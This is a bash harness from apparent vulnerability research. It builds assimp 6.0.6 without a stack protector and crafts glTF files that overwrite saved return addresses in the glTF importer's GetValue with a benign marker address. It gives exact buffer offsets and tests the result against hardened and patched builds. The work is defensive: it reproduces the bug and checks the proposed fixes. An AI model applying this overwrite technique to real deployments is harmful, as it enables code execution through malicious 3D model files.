#!/usr/bin/env bash
# W24: saved-RIP overwrite and benign marker on the pinned MAT4 Indexer path.
#
# The 64-byte copy into `Accessor::Indexer::GetValue`'s 4-byte `value` local
# reaches two saved return addresses when the pinned glTF-only library is
# built at -O0 with -fno-stack-protector. A crafted glTF 1.0 document then
# puts a -no-pie driver's benign marker address into GetValue's saved RIP and
# the marker is observed. This is a rung-4 LAB marker under stated build
# conditions (not a remote service, not r5). Controls: the same bytes at a
# non-control slot, default stack protector, -O1/-O2 inlining, PR7090 hunk
# and PR6860 hunk. The PRs are open unmerged proposed fixes, not releases.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
nsp=build-min-plain-o0-nsp
mkdir -p w24/evidence harness/bin
trace=w24/evidence/w24.trace
log=w24/evidence/w24.log
: >"$trace"
: >"$log"
pass=0
fail=0

check() { # name, required substring, rejected substring
    local name="$1" need="$2" reject="${3-}"
    if ! grep -qF -- "$need" "$trace"; then
        printf 'FAIL %s (missing %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    if [ -n "$reject" ] && grep -qF -- "$reject" "$trace"; then
        printf 'FAIL %s (found %s)\n' "$name" "$reject" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w24/evidence/source-hashes.out
python3 - <<'PY' >>"$trace"
import hashlib
pins = {}
for line in open('PINS.sha256'):
    parts = line.split()
    if len(parts) == 2:
        pins[parts[1].lstrip('*')] = parts[0]
for path in ('code/AssetLib/glTF/glTFAsset.inl', 'code/AssetLib/glTF/glTFImporter.cpp'):
    h = hashlib.sha256(open('pins/assimp-6.0.6/' + path, 'rb').read()).hexdigest()
    print('PIN %s ok=%s' % (path.split('/')[-1], h == pins.get('assimp-6.0.6/' + path, h)))
PY
check pin-asset 'PIN glTFAsset.inl ok=True'
check pin-importer 'PIN glTFImporter.cpp ok=True'

common='-O0 -g -U_FORTIFY_SOURCE -DNDEBUG -fno-omit-frame-pointer'
build_lib() { # build dir, source tree, C flags, CXX flags, asan flag, build type
    local bld="$1" source="$2" cflags="$3" cxxflags="$4" asan="${5-}" bt="${6-}"
    if [ -f "$bld/bin/libassimp.so.6.0.6" ]; then return; fi
    local btype='' ; local -a extra=()
    if [ "$asan" = asan ]; then
        btype=Release
        extra=(-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address
               -DCMAKE_SHARED_LINKER_FLAGS=-fsanitize=address)
    elif [ -n "$bt" ]; then
        btype="$bt"
    fi
    cmake -G Ninja -S "$source" -B "$bld" -DCMAKE_BUILD_TYPE="$btype" \
        -DCMAKE_C_FLAGS="$cflags" -DCMAKE_CXX_FLAGS="$cxxflags" \
        -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_GLTF_IMPORTER=ON \
        -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \
        -DASSIMP_BUILD_TESTS=OFF -DASSIMP_BUILD_SAMPLES=OFF \
        -DASSIMP_BUILD_ZLIB=ON -DASSIMP_WARNINGS_AS_ERRORS=OFF \
        "${extra[@]}" >/dev/null
    cmake --build "$bld" --parallel 2 --target assimp >/dev/null
}
build_lib "$nsp" "$src" "$common -fno-stack-protector" "$common -fno-stack-protector"
build_lib build-min-plain-nf-o0 "$src" "$common" "$common"
o1flags='-O1 -g -U_FORTIFY_SOURCE -DNDEBUG -fno-omit-frame-pointer'
o2flags='-O2 -g -U_FORTIFY_SOURCE -DNDEBUG -fno-omit-frame-pointer'
# The author's -O1 control is a Release build with explicit -O1; CMake's
# appended -O3 inlines GetValue into ImportMeshes. Keep that configuration
# so the measured frame layout matches the baseline W12/W24 observations.
build_lib build-min-plain-nf "$src" "$o1flags" "$o1flags" '' Release
build_lib build-min-plain-nf-o2 "$src" "$o2flags" "$o2flags"

fix7090=pins/fixed7090-6.0.6
if [ ! -f "$fix7090/code/AssetLib/glTF/glTFImporter.cpp" ]; then
    rm -rf "$fix7090"
    cp -a "$src" "$fix7090"
    patch -d "$fix7090" -p0 code/AssetLib/glTF/glTFImporter.cpp < pins/pr7090-gltfImporter.patch
fi
fix6860=pins/fixed-full-6.0.6
if [ ! -f "$fix6860/code/AssetLib/glTF/glTFAsset.inl" ]; then
    rm -rf "$fix6860"
    cp -a "$src" "$fix6860"
    cp pins/fixed-6.0.6/code/AssetLib/glTF/glTFAsset.inl \
        "$fix6860/code/AssetLib/glTF/glTFAsset.inl"
    patch -d "$fix6860" -p0 < pins/pr6860-gltfAsset.h-decl.patch
fi
asanflags='-O1 -g0 -fsanitize=address -fno-omit-frame-pointer'
build_lib build-min-7090 "$fix7090" "$asanflags" "$asanflags" asan
build_lib build-min-fixed "$fix6860" "$asanflags" "$asanflags" asan

build_driver() { # output, build dir, extra driver flags
    local out="$1" bld="$2" extra="${3-}"
    g++ $common -no-pie $extra -I "$src/include" -I "$bld/include" \
        harness/w24_driver.cpp -L "$bld/bin" -lassimp \
        -Wl,-rpath,"$PWD/$bld/bin" -o "harness/bin/$out" 2>/dev/null
}
build_driver w24_nsp "$nsp" -fno-stack-protector
build_driver w24_o0sp build-min-plain-nf-o0
build_driver w24_o1 build-min-plain-nf
build_driver w24_o2 build-min-plain-nf-o2
build_driver w24_7090 build-min-7090
build_driver w24_6860 build-min-fixed

marker=$(harness/bin/w24_nsp harness/cases/safe.gltf | sed -n 's/^MARKER_ADDR=//p')
python3 - "$marker" <<'PY'
import base64, json, struct, sys
addr = int(sys.argv[1], 16)
base = json.load(open('harness/cases/mat4idx-count1.gltf'))
head, data = base['buffers']['buf']['uri'].split(',', 1)
raw = base64.b64decode(data)
word = struct.pack('<Q', addr)
# In the -O0 no-stack-protector build the saved RIPs sit at write offsets
# 12 (GetValue) and 44 (GetUInt): decoded offsets 48..55 and 80..87.
for name, edits in [('w24-marker-rip', {48: word, 80: word}),
                    ('w24-marker-nonctl', {56: word})]:
    buf = bytearray(raw)
    for off, val in edits.items():
        buf[off:off + 8] = val
    doc = json.loads(json.dumps(base))
    doc['buffers']['buf']['uri'] = head + ',' + base64.b64encode(bytes(buf)).decode()
    open('harness/cases/%s.gltf' % name, 'w').write(json.dumps(doc, indent=2) + '\n')
print('MARKER %s' % sys.argv[1])
PY

run_case() { # driver, case, label
    local drv="$1" casefile="$2" label="$3" rc=0 out="w24/evidence/$3.out"
    harness/bin/"$drv" "harness/cases/$casefile.gltf" >"$out" 2>&1 || rc=$?
    printf 'CASE %s rc=%s marker=%s scene=%s\n' "$label" "$rc" \
        "$(grep -qF TAUF_MARKER_CALLED "$out" && echo 1 || echo 0)" \
        "$(sed -n 's/^case=.* scene=\([a-z]*\).*/\1/p' "$out")" >>"$trace"
}

run_case w24_nsp safe nsp-safe
run_case w24_nsp w24-marker-rip nsp-marker-rip
run_case w24_nsp w24-marker-nonctl nsp-marker-nonctl
run_case w24_o0sp w24-marker-rip o0sp-marker-rip
run_case w24_o1 w24-marker-rip o1-marker-rip
run_case w24_o2 w24-marker-rip o2-marker-rip

asan_preload=$(gcc -print-file-name=libasan.so.8)
LD_PRELOAD="$asan_preload" ASAN_OPTIONS=detect_leaks=0 \
    run_case w24_7090 w24-marker-rip fixed7090-marker-rip
LD_PRELOAD="$asan_preload" ASAN_OPTIONS=detect_leaks=0 \
    run_case w24_6860 w24-marker-rip fixed6860-marker-rip

check nsp-safe 'CASE nsp-safe rc=0 marker=0 scene=ok'
check nsp-marker 'CASE nsp-marker-rip rc=0 marker=1 scene='
check nsp-nonctl 'CASE nsp-marker-nonctl rc=139 marker=0'
check o0sp-guard 'CASE o0sp-marker-rip rc=134 marker=0'
check o1-no-marker 'CASE o1-marker-rip rc=139 marker=0'
check o2-no-marker 'CASE o2-marker-rip rc=139 marker=0'
check fixed7090 'CASE fixed7090-marker-rip rc=1 marker=0'
check fixed6860 'CASE fixed6860-marker-rip rc=134 marker=0'

frame() { # driver, case, label
    gdb -q -batch -x harness/w24_frame.gdb \
        --args "harness/bin/$1" "harness/cases/$2.gltf" >"w24/evidence/$3-frame.out" 2>&1 || true
    python3 - "$3" <<'PY' >>"$trace"
import sys
label = sys.argv[1]
text = open('w24/evidence/%s-frame.out' % label).read()
hit = [l for l in text.splitlines() if l.startswith('W24_HIT ')]
deltas = sorted(int(l.split('delta=')[1].split()[0]) for l in text.splitlines()
                if l.startswith('W24_RIP ') and 'inwindow=1' in l)
above = [d for d in (int(l.split('delta=')[1].split()[0]) for l in text.splitlines()
                     if l.startswith('W24_RIP ')) if d > 0]
print('FRAME %s hit=%s inwindow=%s nearest_above=%s' %
      (label, len(hit), ','.join(map(str, deltas)) or '-',
       min(above) if above else '-'))
PY
}
frame w24_nsp mat4idx-count1 nsp-o0
frame w24_o1 mat4idx-count1 o1

check frame-o0 'FRAME nsp-o0 hit=1 inwindow=12,44'
check frame-o1 'FRAME o1 hit=1 inwindow=-'

printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" | tee -a "$log"
printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" >>"$trace"
sha256sum w24/evidence/*.out | tee -a "$log"
